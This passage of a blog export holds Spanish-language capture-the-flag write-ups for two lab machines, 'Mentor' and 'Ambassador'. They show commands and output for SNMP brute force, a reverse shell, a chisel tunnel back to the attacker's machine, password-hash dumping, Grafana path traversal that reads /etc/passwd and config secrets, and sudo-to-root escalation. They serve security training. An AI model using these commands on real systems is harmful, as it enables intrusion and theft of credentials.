Continuamos.</p><p>Investigando un poco los archivos, encontramos la siguiente información dentro un archivo <em>/app/app/db.py:</em></p><pre><code class=\"language-py\">DATABASE_URL = os.getenv(\"DATABASE_URL\", \"postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\")</code></pre><p>Anotamos la información. Parece ser que hay una base de datos en el host, solamente accesible desde el contenedor.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/12/Untitled-2022-12-30-2011-1.svg\" class=\"kg-image\" alt loading=\"lazy\" width=\"1064\" height=\"461\"><figcaption>Pivoting example</figcaption></figure><p>Con ayuda de <a href=\"https://github.com/jpillora/chisel\"><em>Chisel</em></a>, ejecutamos en nuestra máquina el siguiente comando:</p><pre><code class=\"language-bash\">&gt; chisel server -p 1234 --reverse\n2022/12/30 23:13:54 server: Reverse tunnelling enabled\n2022/12/30 23:13:54 server: Fingerprint Y7dAMONRX/NODc3O0jqzg1tBqi8OKrLrLIItmMkAJoc=\n2022/12/30 23:13:54 server: Listening on http://0.0.0.0:1234</code></pre><p>Y en la máquina objetivo:</p><pre><code class=\"language-bash\">&gt; chisel client 10.10.14.88:1234 R:5431:172.22.0.1:5432\n2022/12/30 22:16:41 client: Connecting to ws://10.10.14.88:1234\n2022/12/30 22:16:41 client: Connected (Latency 104.066799ms)\n</code></pre><p>Una vez establecida la conexión, desde nuestra máquina podemos lanzar los comandos necesarios para interactuar con la base de datos de Postgresql.</p><pre><code class=\"language-bash\">&gt; psql -h localhost -d mentorquotes_db -U postgres -p 5431\nmentorquotes_db=# \\dt\n          List of relations\n Schema |   Name   | Type  |  Owner   \n--------+----------+-------+----------\n public | cmd_exec | table | postgres\n public | quotes   | table | postgres\n public | users    | table | postgres\n(3 rows)\n\nmentorquotes_db=# select * from users;\n id |         email          |  username   |             password             \n----+------------------------+-------------+----------------------------------\n  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503\n  2 | svc@mentorquotes.htb   | service_acc | 53fxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n(3 rows)</code></pre><p>En <a href=\"https://crackstation.net/\">https://crackstation.net/</a> podemos crackear el hash del password correspondiente al usuario service_acc.</p><p>Nos conectamos por <em>ssh </em>a la máquina, esta vez ya sí directamente al host, y continuamos con el escalado de privilegios.</p><pre><code class=\"language-bash\">&gt; sshpass -p 123meunomeeivani ssh svc@10.10.11.193\nsvc@mentor:~$ whoami\nsvc\nsvc@mentor:~$ id\nuid=1001(svc) gid=1001(svc) groups=1001(svc)</code></pre><h2 id=\"escalada-de-privilegios\">Escalada de privilegios</h2><p>Retomando SNMP, vemos su archivo de configuración en /etc/snmp/snmpd.conf</p><pre><code class=\"language-bash\">&gt; cat /etc/snmp/snmpd.conf\n...\ncreateUser bootstrap MD5 SuperSecurePassword123__ DES\n...</code></pre><p>Probamos a logearnos al usuario james con esa contraseña.</p><pre><code class=\"language-bash\">&gt; su - james\nPassword: \njames@mentor:~$ whoami\njames</code></pre><p>Pero seguimos sin ser root.</p><p>Vemos qué permisos de sudo tenemos</p><pre><code class=\"language-bash\">&gt; sudo -l\n[sudo] password for james: \nMatching Defaults entries for james on mentor:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser james may run the following commands on mentor:\n    (ALL) /bin/sh</code></pre><p>Es decir, podemos ejecutar <em>/bin/sh </em>como sudo.</p><pre><code class=\"language-bash\">&gt; james@mentor:~$ sudo /bin/sh\n# whoami\nroot\n# cat /root/root.txt\ne01xxxxxxxxxxxxxxxxx\n</code></pre>",
            "comment_id": "63af2f59fef629005bc8cf00",
            "plaintext": "Fase de enumeración\n\nRealizamos un escaneo completo de puertos con NMAP.\n\n> nmap -p- -sCV -vvv --min-rate 5000 -oG allPorts 10.10.11.193\n\n[*] Open ports: 22, 80\n\nY apuntamos concretamente a los puertos 22 y 80, con tal de sacar más información que nos pueda ser útil.\n\n> nmap -p22,80 -vvv -sCV -oN targeted 10.10.11.193\n\n# Output\nPORT   STATE SERVICE REASON  VERSION\n22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO6yWCATcj2UeU/SgSa+wK2fP5ixsrHb6pgufdO378n+BLNiDB6ljwm3U3PPdbdQqGZo1K7Tfsz+ejZj1nV80RY=\n|   256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjv9f3Jbxj42smHEXcChFPMNh1bqlAFHLi4Nr7w9fdv\n80/tcp open  http    syn-ack Apache httpd 2.4.52\n|_http-title: Did not follow redirect to http://mentorquotes.htb/\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.52 (Ubuntu)\nService Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n\nAquí ya vemos cosas interesantes. El servidor detrás del puerto 80, redirige peticiones a mentorquotes.htb, por lo que modificaremos nuestro archivo hosts con tal de poder resolver dicho dominio cuando llamemos al servidor Apache.\n\n# /etc/hosts\n# Host addresses\n127.0.0.1  localhost\n127.0.1.1  parrot\n::1        localhost ip6-localhost ip6-loopback\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n# Others\n10.10.11.193   mentorquotes.htb\n\nAbrimos Firefox, y accedemos a la url:\n\nEn esta página no hay mucho que ver. Con whatweb extraemos la siguiente información:\n\n> whatweb mentorquotes.htb\nhttp://mentorquotes.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.3 Python/3.6.9], IP[10.10.11.193], Python[3.6.9], Title[MentorQuotes], Werkzeug[2.0.3]\n\nWerkzeug, es una librería muy común de Frameworks de Python como Flask y Django. Una primera aproximación es ver si está el modo debug activo accediendo a la URL /console como explican aquí. No tenemos tanta suerte por el momento, a sí que lo próximo es aplicar fuzzing en busca de subdominios desconocidos.\n\n\nEnumeración Web\n\n> wfuzz -c --hc=302 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.mentorquotes.htb\" mentorquotes.htb\n\n# Output\n===============================================================\nID           Response   Lines    Word       Chars       Payload\n===============================================================\n000000051:   404        0 L      2 W        22 Ch       \"api\"\n\nImportante destacar que en la llamada, NO estamos ocultando las peticiones 404 con el parametro --hc. Esto es porque los subdominios que no existen, en este caso, se redirigen siempre devolviendo un estado 302.\n\nEl resultado del fuzzing es que parece existir un subdominio http://api.mentorquotes.htb. Lo añadimos a nuestro /etc/hosts.\n\n# /etc/hosts\n# Host addresses\n127.0.0.1  localhost\n127.0.1.1  parrot\n::1        localhost ip6-localhost ip6-loopback\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n# Others\n10.10.11.193   mentorquotes.htb     api.mentorquotes.htb\n\nAplicando un CURL, vemos lo siguiente:\n\n> curl -I api.mentorquotes.htb\nHTTP/1.1 404 Not Found\nDate: Fri, 30 Dec 2022 19:05:13 GMT\nServer: uvicorn\ncontent-length: 22\ncontent-type: application/json\n\nEn este caso, es el propio servidor Uvicorn el que está contestándonos. Parece ser que Apache está actuando de Reverse Proxy cuando accedemos a ciertos dominios/subdominios.\n\nRepetimos el fuzzing contra el subdominio que acabamos de encontrar, a ver si hay alguna ruta oculta.\n\n> wfuzz -c --hc=404,302 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: api.mentorquotes.htb\" mentorquotes.htb/FUZZ\n\n# Output\n================================================================\nID           Response   Lines    Word       Chars       Payload\n================================================================\n000000150:   200        30 L     62 W       969 Ch      \"docs\" \n000000024:   307        0 L      0 W        0 Ch        \"admin\" \n000000646:   307        0 L      0 W        0 Ch        \"users\"\n000002314:   307        0 L      0 W        0 Ch        \"quotes\"\n\nParece ser que estamos ante una API con Swagger.\n\nAdemás, encontramos a un usuario james@mentorquotes.htb. Podemos llegar a registrar un usuario, pero no podemos continuar por este camino.\n\nVamos a ver si SNMP está funcionando en el servidor. Utilizaremos de nuevo nmap con permisos de sudo para poder utilizar el descubrimiento de puertos UDP.\n\n> sudo nmap -p161 -sU 10.10.11.193\nPORT    STATE SERVICE\n161/udp open  snmp\n\n\nAbusando de SNMP\n\nSNMP puede funcionar bajo diferentes versiones. Utilizamos una herramienta de fuerza bruta para enumerar que versiones están disponibles en el servidor, así como las community string que utilizan.\n\n> python snmpbrute.py -t 10.10.11.193\n   _____ _   ____  _______     ____             __     \n  / ___// | / /  |/  / __ \\   / __ )_______  __/ /____ \n  \\__ \\/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \\\n ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/\n/____/_/ |_/_/  /_/_/      /_____/_/   \\__,_/\\__/\\___/ \n\nSNMP Bruteforce & Enumeration Script v2.0\nhttp://www.secforce.com / nikos.vassakis <at> secforce.com\n###############################################################\n10.10.11.193 : 161 \tVersion (v2c):\tinternal\n10.10.11.193 : 161 \tVersion (v1):\tpublic\n10.10.11.193 : 161 \tVersion (v2c):\tpublic\n10.10.11.193 : 161 \tVersion (v1):\tpublic\n10.10.11.193 : 161 \tVersion (v2c):\tpublic\n\nLa community string public suele ser la que viene por defecto. Parece sospechosa la internal que funciona bajo la versión v2c. Vamos a tirar por ahí.\n\nLanzamos el comando snmpwalk durante unos minutos y almacenamos la salida del comando en un archivo para poderlo consultar posteriormente.\n\n> snmpwalk -v2c -c internal 10.10.11.193 | tee snmpwalk.log\n\nEl parámetro -c es para establecer la cadena de comunidad con la que queremos escuchar. Normalmente, el valor es public, pero en este caso, con public no obtenemos ninguna información valiosa.\n\nCerca del final, encontramos la siguiente línea:\n\niso.3.6.1.2.1.25.4.2.1.5.2126 = STRING: \"/usr/local/bin/login.py kj2xxxxxxxxxxxxxx\"\n\nCon ayuda de Swagger o directamente, con CURL, utilizamos esa contraseña que empieza por kj2... en uno de los endpoints de la API.\n\ncurl -X 'POST' \\\n  'http://api.mentorquotes.htb/auth/login' \\\n  -H 'accept: application/json' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n  \"email\": \"james@mentorquotes.htb\",\n  \"username\": \"james\",\n  \"password\": \"kj23sadkj123as0-d213\"\n}'\n\n# Output\n\"eyJxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"%\n\n\nExplotación\n\nArrancamos Burpsuite e interceptamos una petición hacia http://api.mentorquotes.htb/admin. Debemos incrustar el parámetro Authorization junto con el Token recogido en la petición anterior.\n\nVemos que existen dos nuevos endpoints. /check y /backup. Parece que el primero no funciona, y el segundo, solo funciona si la petición es de tipo POST. Además, el parámetro Content-Type debe ser application/json y espera recibir un diccionario del siguiente tipo: {\"body\": \"xxx\", \"path\": \"xxx\"}.\n\nSegún parece, el valor que dejas en el parámetro path es vulnerable a RCE. Escuchamos en el puerto 1234 con Netcat y entablamos una reverse shell. Por un lado, tenemos lo siguiente:\n\nY por el otro, entablamos la shell:\n\n> sudo nc -lvnp 1234\nlistening on [any] 1234 ...\nconnect to [10.10.14.88] from (UNKNOWN) [10.10.11.193] 34881\nsh: can't access tty; job control turned off\n/app # whoami\nroot\n/app # cat /home/svc/user.txt\n3eaXXXXXXXXXXXXXXXXXXXXXXXX\n\nPrimera flag capturada. Tiene pinta que estamos dentro de un contenedor y que la próxima flag está fuera de él. Continuamos.\n\nInvestigando un poco los archivos, encontramos la siguiente información dentro un archivo /app/app/db.py:\n\nDATABASE_URL = os.getenv(\"DATABASE_URL\", \"postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\")\n\nAnotamos la información. Parece ser que hay una base de datos en el host, solamente accesible desde el contenedor.\n\nCon ayuda de Chisel, ejecutamos en nuestra máquina el siguiente comando:\n\n> chisel server -p 1234 --reverse\n2022/12/30 23:13:54 server: Reverse tunnelling enabled\n2022/12/30 23:13:54 server: Fingerprint Y7dAMONRX/NODc3O0jqzg1tBqi8OKrLrLIItmMkAJoc=\n2022/12/30 23:13:54 server: Listening on http://0.0.0.0:1234\n\nY en la máquina objetivo:\n\n> chisel client 10.10.14.88:1234 R:5431:172.22.0.1:5432\n2022/12/30 22:16:41 client: Connecting to ws://10.10.14.88:1234\n2022/12/30 22:16:41 client: Connected (Latency 104.066799ms)\n\n\nUna vez establecida la conexión, desde nuestra máquina podemos lanzar los comandos necesarios para interactuar con la base de datos de Postgresql.\n\n> psql -h localhost -d mentorquotes_db -U postgres -p 5431\nmentorquotes_db=# \\dt\n          List of relations\n Schema |   Name   | Type  |  Owner   \n--------+----------+-------+----------\n public | cmd_exec | table | postgres\n public | quotes   | table | postgres\n public | users    | table | postgres\n(3 rows)\n\nmentorquotes_db=# select * from users;\n id |         email          |  username   |             password             \n----+------------------------+-------------+----------------------------------\n  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503\n  2 | svc@mentorquotes.htb   | service_acc | 53fxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n(3 rows)\n\nEn https://crackstation.net/ podemos crackear el hash del password correspondiente al usuario service_acc.\n\nNos conectamos por ssh a la máquina, esta vez ya sí directamente al host, y continuamos con el escalado de privilegios.\n\n> sshpass -p 123meunomeeivani ssh svc@10.10.11.193\nsvc@mentor:~$ whoami\nsvc\nsvc@mentor:~$ id\nuid=1001(svc) gid=1001(svc) groups=1001(svc)\n\n\nEscalada de privilegios\n\nRetomando SNMP, vemos su archivo de configuración en /etc/snmp/snmpd.conf\n\n> cat /etc/snmp/snmpd.conf\n...\ncreateUser bootstrap MD5 SuperSecurePassword123__ DES\n...\n\nProbamos a logearnos al usuario james con esa contraseña.\n\n> su - james\nPassword: \njames@mentor:~$ whoami\njames\n\nPero seguimos sin ser root.\n\nVemos qué permisos de sudo tenemos\n\n> sudo -l\n[sudo] password for james: \nMatching Defaults entries for james on mentor:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser james may run the following commands on mentor:\n    (ALL) /bin/sh\n\nEs decir, podemos ejecutar /bin/sh como sudo.\n\n> james@mentor:~$ sudo /bin/sh\n# whoami\nroot\n# cat /root/root.txt\ne01xxxxxxxxxxxxxxxxx\n",
            "feature_image": "__GHOST_URL__/content/images/2022/12/Mentor.png",
            "featured": 0,
            "type": "post",
            "status": "draft",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-12-30T18:35:05.000Z",
            "updated_at": "2022-12-31T11:36:24.000Z",
            "published_at": null,
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63b1da83fae523005bfcee1b",
            "uuid": "52f75f93-e569-4422-ac25-b23907437567",
            "title": "CTF - Ambassador WriteUp",
            "slug": "ctf-ambassador-writeup",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"language\":\"bash\",\"code\":\"> nmap -p- -sCV -vvv --min-rate 5000 -oG allPorts 10.10.11.183\\n\\n# Output\\n[*] Open ports: 22,80,3000,3306\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> nmap -p22,80,3000,3306 -vvv -sCV 10.10.11.183 -oN targeted\\n\\n# Output\\nPORT     STATE SERVICE REASON  VERSION\\n22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey: \\n|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)\\n80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))\\n|_http-server-header: Apache/2.4.41 (Ubuntu)\\n|_http-generator: Hugo 0.94.2\\n| http-methods: \\n|_  Supported Methods: POST OPTIONS HEAD GET\\n|_http-title: Ambassador Development Server\\n3000/tcp open  ppp?    syn-ack\\n| fingerprint-strings: \\n|   FourOhFourRequest: \\n|     HTTP/1.0 302 Found\\n|     Cache-Control: no-cache\\n|     Content-Type: text/html; charset=utf-8\\n|     Expires: -1\\n|     Location: /login\\n|     Pragma: no-cache\\n|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax\\n|     X-Content-Type-Options: nosniff\\n|     X-Frame-Options: deny\\n|     X-Xss-Protection: 1; mode=block\\n|     Date: Sun, 01 Jan 2023 19:33:04 GMT\\n|     Content-Length: 29\\n|     href=\\\"/login\\\">Found</a>.\\n3306/tcp open  mysql   syn-ack MySQL 8.0.30-0ubuntu0.20.04.2\\n| mysql-info: \\n|   Protocol: 10\\n|   Version: 8.0.30-0ubuntu0.20.04.2\\n|   Thread ID: 15\\n|   Capabilities flags: 65535\\n\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/01/image.png\",\"width\":694,\"height\":705}],[\"code\",{\"language\":\"bash\",\"code\":\"> searchsploit grafana 8.3\\n---------------------------------------------------------------------------\\n Exploit Title                                               |  Path\\n---------------------------------------------------------------------------\\nGrafana 8.3.0 - Directory Traversal and Arbitrary File Read  |    multiple/webapps/50581.py\\n---------------------------------------------------------------------------\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> curl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../etc/passwd\\n\\n# Output\\nroot:x:0:0:root:/root:/bin/bash\\n...\\ndeveloper:x:1000:1000:developer:/home/developer:/bin/bash\\n...\\ngrafana:x:113:118::/usr/share/grafana:/bin/false\\nmysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false\\nconsul:x:997:997::/home/consul:/bin/false\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> curl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../etc/grafana/grafana.ini\\n\\n# Output\\n...\\n# default admin user, created on startup\\n;admin_user = admin\\n\\n# default admin password, can be changed before first start of grafana,  or in profile settings\\nadmin_password = messageInABottle685427\\n...\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/01/image-1.png\",\"width\":489,\"height\":283,\"caption\":\"Mysql configurado en Grafana\"}],[\"code\",{\"language\":\"bash\",\"code\":\"curl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db\\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\\n100  644k  100  644k    0     0   529k      0  0:00:01  0:00:01 --:--:--  529k\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> sqlite3 grafana.db\\nsqlite> .tables\\n...          \\ndata_source                 test_data                 \\n...\\nsqlite> select * from data_source;\\n2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-01 19:26:31|0|{}|1|uKewFgM4z\",\"caption\":\"\"}]],\"markups\":[[\"em\"]],\"sections\":[[1,\"p\",[[0,[],0,\"Esta máquina ha sido una que me ha gustado mucho. Sobre todo la primera parte hasta llegar a la escalada de privilegios.\"]]],[1,\"h2\",[[0,[],0,\"Enumeración\"]]],[10,0],[1,\"p\",[[0,[],0,\"Si analizamos concretamente los puertos expuestos, nos encontramos con la siguiente información.\"]]],[10,1],[1,\"p\",[[0,[],0,\"Tenemos el puerto de \"],[0,[0],1,\"SSH\"],[0,[],0,\", lo que parece un s\"],[0,[0],1,\"ervidor web\"],[0,[],0,\" típico en el puerto 80, algo desconocido en el puerto 3000 y una base de datos \"],[0,[0],1,\"MySQL \"],[0,[],0,\"en el puerto 3306.\"]]],[1,\"h2\",[[0,[],0,\"Local File Inclusion\"]]],[1,\"p\",[[0,[],0,\"Como me corroe la curiosidad, empiezo por el puerto 3000 y me encuentro Grafana instalado.\"]]],[10,2],[1,\"p\",[[0,[],0,\"Una búsqueda rápida en searchsploit me devuelve una vulnerabilidad para las versiones de Grafana anteriores a la versión 8.3.\"]]],[10,3],[1,\"p\",[[0,[],0,\"Examinando un poco el exploit, vemos que podemos provocar un LFI con un simple comando de CURL.\"]]],[10,4],[1,\"p\",[[0,[],0,\"Buscando un poco por archivos que pueden resultarnos de interés en este caso, examinamos el archivo de configuración de Grafana almacenado en \"],[0,[0],1,\"/etc/grafana/grafana.ini\"],[0,[],0,\".\"]]],[10,5],[1,\"p\",[[0,[],0,\"Con esas credenciales, podemos entrar directamente al panel de Grafana. En él, vemos que hay una base de datos MySQL configurada, pero no podemos ver sus credenciales. Además de eso, no hay mucho más que podamos hacer por esa vía. Otra ruta de interés es \"],[0,[0],1,\"/var/lib/grafana/grafana.db.\"]]],[10,6],[1,\"p\",[[0,[],0,\"Esta ruta contiene una base de datos \"],[0,[0],1,\"sqlite, \"],[0,[],0,\"donde se almacenan los Dashboards configurados. Con el siguiente comando nos descargamos la base de datos.\"]]],[10,7],[1,\"p\",[[0,[],0,\"Y empezamos a mirar cosas:\"]]],[10,8],[1,\"p\",[[0,[],0,\"Llegado a este punto, probamos a \"]]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Esta máquina ha sido una que me ha gustado mucho. Sobre todo la primera parte hasta llegar a la escalada de privilegios.</p><h2 id=\"enumeraci%C3%B3n\">Enumeración</h2><pre><code class=\"language-bash\">&gt; nmap -p- -sCV -vvv --min-rate 5000 -oG allPorts 10.10.11.183\n\n# Output\n[*] Open ports: 22,80,3000,3306</code></pre><p>Si analizamos concretamente los puertos expuestos, nos encontramos con la siguiente información.</p><pre><code class=\"language-bash\">&gt; nmap -p22,80,3000,3306 -vvv -sCV 10.10.11.183 -oN targeted\n\n# Output\nPORT     STATE SERVICE REASON  VERSION\n22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)\n80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-generator: Hugo 0.94.2\n| http-methods: \n|_  Supported Methods: POST OPTIONS HEAD GET\n|_http-title: Ambassador Development Server\n3000/tcp open  ppp?    syn-ack\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.0 302 Found\n|     Cache-Control: no-cache\n|     Content-Type: text/html; charset=utf-8\n|     Expires: -1\n|     Location: /login\n|     Pragma: no-cache\n|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax\n|     X-Content-Type-Options: nosniff\n|     X-Frame-Options: deny\n|     X-Xss-Protection: 1; mode=block\n|     Date: Sun, 01 Jan 2023 19:33:04 GMT\n|     Content-Length: 29\n|     href=\"/login\"&gt;Found&lt;/a&gt;.\n3306/tcp open  mysql   syn-ack MySQL 8.0.30-0ubuntu0.20.04.2\n| mysql-info: \n|   Protocol: 10\n|   Version: 8.0.30-0ubuntu0.20.04.2\n|   Thread ID: 15\n|   Capabilities flags: 65535\n\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre><p>Tenemos el puerto de <em>SSH</em>, lo que parece un s<em>ervidor web</em> típico en el puerto 80, algo desconocido en el puerto 3000 y una base de datos <em>MySQL </em>en el puerto 3306.</p><h2 id=\"local-file-inclusion\">Local File Inclusion</h2><p>Como me corroe la curiosidad, empiezo por el puerto 3000 y me encuentro Grafana instalado.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2023/01/image.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"694\" height=\"705\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/01/image.png 600w, __GHOST_URL__/content/images/2023/01/image.png 694w\"></figure><p>Una búsqueda rápida en searchsploit me devuelve una vulnerabilidad para las versiones de Grafana anteriores a la versión 8.3.</p><pre><code class=\"language-bash\">&gt; searchsploit grafana 8.3\n---------------------------------------------------------------------------\n Exploit Title                                               |  Path\n---------------------------------------------------------------------------\nGrafana 8.3.0 - Directory Traversal and Arbitrary File Read  |    multiple/webapps/50581.py\n---------------------------------------------------------------------------</code></pre><p>Examinando un poco el exploit, vemos que podemos provocar un LFI con un simple comando de CURL.</p><pre><code class=\"language-bash\">&gt; curl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../etc/passwd\n\n# Output\nroot:x:0:0:root:/root:/bin/bash\n...\ndeveloper:x:1000:1000:developer:/home/developer:/bin/bash\n...\ngrafana:x:113:118::/usr/share/grafana:/bin/false\nmysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false\nconsul:x:997:997::/home/consul:/bin/false</code></pre><p>Buscando un poco por archivos que pueden resultarnos de interés en este caso, examinamos el archivo de configuración de Grafana almacenado en <em>/etc/grafana/grafana.ini</em>.</p><pre><code class=\"language-bash\">&gt; curl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../etc/grafana/grafana.ini\n\n# Output\n...\n# default admin user, created on startup\n;admin_user = admin\n\n# default admin password, can be changed before first start of grafana,  or in profile settings\nadmin_password = messageInABottle685427\n...</code></pre><p>Con esas credenciales, podemos entrar directamente al panel de Grafana. En él, vemos que hay una base de datos MySQL configurada, pero no podemos ver sus credenciales. Además de eso, no hay mucho más que podamos hacer por esa vía. Otra ruta de interés es <em>/var/lib/grafana/grafana.db.</em></p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2023/01/image-1.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"489\" height=\"283\"><figcaption>Mysql configurado en Grafana</figcaption></figure><p>Esta ruta contiene una base de datos <em>sqlite, </em>donde se almacenan los Dashboards configurados. Con el siguiente comando nos descargamos la base de datos.</p><pre><code class=\"language-bash\">curl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n100  644k  100  644k    0     0   529k      0  0:00:01  0:00:01 --:--:--  529k</code></pre><p>Y empezamos a mirar cosas:</p><pre><code class=\"language-bash\">&gt; sqlite3 grafana.db\nsqlite&gt; .tables\n...          \ndata_source                 test_data                 \n...\nsqlite&gt; select * from data_source;\n2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-01 19:26:31|0|{}|1|uKewFgM4z</code></pre><p>Llegado a este punto, probamos a </p>",
            "comment_id": "63b1da83fae523005bfcee1b",
            "plaintext": "Esta máquina ha sido una que me ha gustado mucho. Sobre todo la primera parte hasta llegar a la escalada de privilegios.\n\n\nEnumeración\n\n> nmap -p- -sCV -vvv --min-rate 5000 -oG allPorts 10.10.11.183\n\n# Output\n[*] Open ports: 22,80,3000,3306\n\nSi analizamos concretamente los puertos expuestos, nos encontramos con la siguiente información.\n\n> nmap -p22,80,3000,3306 -vvv -sCV 10.10.11.183 -oN targeted\n\n# Output\nPORT     STATE SERVICE REASON  VERSION\n22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)\n80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-generator: Hugo 0.94.2\n| http-methods: \n|_  Supported Methods: POST OPTIONS HEAD GET\n|_http-title: Ambassador Development Server\n3000/tcp open  ppp?    syn-ack\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.0 302 Found\n|     Cache-Control: no-cache\n|     Content-Type: text/html; charset=utf-8\n|     Expires: -1\n|     Location: /login\n|     Pragma: no-cache\n|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax\n|     X-Content-Type-Options: nosniff\n|     X-Frame-Options: deny\n|     X-Xss-Protection: 1; mode=block\n|     Date: Sun, 01 Jan 2023 19:33:04 GMT\n|     Content-Length: 29\n|     href=\"/login\">Found</a>.\n3306/tcp open  mysql   syn-ack MySQL 8.0.30-0ubuntu0.20.04.2\n| mysql-info: \n|   Protocol: 10\n|   Version: 8.0.30-0ubuntu0.20.04.2\n|   Thread ID: 15\n|   Capabilities flags: 65535\n\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n\nTenemos el puerto de SSH, lo que parece un servidor web típico en el puerto 80, algo desconocido en el puerto 3000 y una base de datos MySQL en el puerto 3306.\n\n\nLocal File Inclusion\n\nComo me corroe la curiosidad, empiezo por el puerto 3000 y me encuentro Grafana instalado.\n\nUna búsqueda rápida en searchsploit me devuelve una vulnerabilidad para las versiones de Grafana anteriores a la versión 8.3.\n\n> searchsploit grafana 8.3\n---------------------------------------------------------------------------\n Exploit Title                                               |  